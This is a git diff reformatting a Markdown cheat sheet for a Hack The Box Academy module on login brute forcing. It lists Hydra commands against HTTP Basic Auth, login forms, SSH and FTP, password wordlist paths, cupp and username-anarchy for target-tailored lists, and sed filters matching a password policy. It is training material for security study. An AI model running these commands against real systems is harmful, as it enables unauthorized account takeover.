@@ -1,43 +1,50 @@
 ---
 title: Login Brute Forcing
-difficulty: fundamental
+description: Learn how to brute force logins for various types of services and create custom wordlists based on your target.
+author:
+  - 21y4d
+difficulty: Easy
 tier: 2
-type: offensive
+type: Offensive
+time: 6 hours
 slug: login-brute-forcing
-banner: /cheatsheets/login-brute-forcing.webp
 badge: /cheatsheets/badges/crude-but-effective.webp
-sharebleLink: https://academy.hackthebox.com/achievement/badge/2602396f-e3c0-11ee-b18d-bea50ffe6cb4
-completedOn: 2024-03-16
+module: /cheatsheets/login-brute-forcing.webp
+badgeLink: https://academy.hackthebox.com/achievement/badge/2602396f-e3c0-11ee-b18d-bea50ffe6cb4
+moduleLink: https://academy.hackthebox.com/achievement/361848/57
+completedAt: 2024-03-16
+tags:
+  - cheatsheet
+  - CBBH
 ---
+# Hydra
 
-## Hydra
+|**Command**|**Description**|
+|---|---|
+|`hydra -h`|hydra help|
+|`hydra -C wordlist.txt SERVER_IP -s PORT http-get /`|Basic Auth Brute Force - Combined Wordlist|
+|`hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /`|Basic Auth Brute Force - User/Pass Wordlists|
+|`hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"`|Login Form Brute Force - Static User, Pass Wordlist|
+|`hydra -L bill.txt -P william.txt -u -f ssh://SERVER_IP:PORT -t 4`|SSH Brute Force - User/Pass Wordlists|
+|`hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1`|FTP Brute Force - Static User, Pass Wordlist|
 
-|**Command** | **Description** |
-| :--------- | :-------------- |
-| `hydra -h`| hydra help |
-| `hydra -C wordlist.txt SERVER_IP -s PORT http-get /` | Basic Auth Brute Force - Combined Wordlist |
-| `hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /` | Basic Auth Brute Force - User/Pass Wordlists |
-| `hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"` | Login Form Brute Force - Static User, Pass Wordlist |
-| `hydra -L bill.txt -P william.txt -u -f ssh://SERVER_IP:PORT -t 4` | SSH Brute Force - User/Pass Wordlists |
-| `hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1` | FTP Brute Force - Static User, Pass Wordlist |
+# Wordlists
 
-## Wordlists
-
-|**Command** | **Description** |
-| :--------- | :-------------- |
+|**Command**|**Description**|
+|---|---|
 |`/opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt`|Default Passwords Wordlist|
 |`/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt`|Common Passwords Wordlist|
 |`/opt/useful/SecLists/Usernames/Names/names.txt`|Common Names Wordlist|
 
-## Misc
+# Misc
 
-|**Command** | **Description** |
-| :--------- | :-------------- |
-| `cupp -i`                                       | Creating Custom Password Wordlist      |
-| `sed -ri '/^.{,7}$/d' william.txt`              | Remove Passwords Shorter Than 8        |
-| ``sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt`` | Remove Passwords With No Special Chars |
-| `sed -ri '/[0-9]+/!d' william.txt`              | Remove Passwords With No Numbers       |
-| `./username-anarchy Bill Gates > bill.txt`      | Generate Usernames List                |
-| `ssh b.gates@SERVER_IP -p PORT`                 | SSH to Server                          |
-| `ftp 127.0.0.1`                                 | FTP to Server                          |
-| `su - user`                                     | Switch to User                         |
+|**Command**|**Description**|
+|---|---|
+|`cupp -i`|Creating Custom Password Wordlist|
+|`sed -ri '/^.{,7}$/d' william.txt`|Remove Passwords Shorter Than 8|
+|``sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt``|Remove Passwords With No Special Chars|
+|`sed -ri '/[0-9]+/!d' william.txt`|Remove Passwords With No Numbers|
+|`./username-anarchy Bill Gates > bill.txt`|Generate Usernames List|
+|`ssh b.gates@SERVER_IP -p PORT`|SSH to Server|
+|`ftp 127.0.0.1`|FTP to Server|
+|`su - user`|Switch to User|
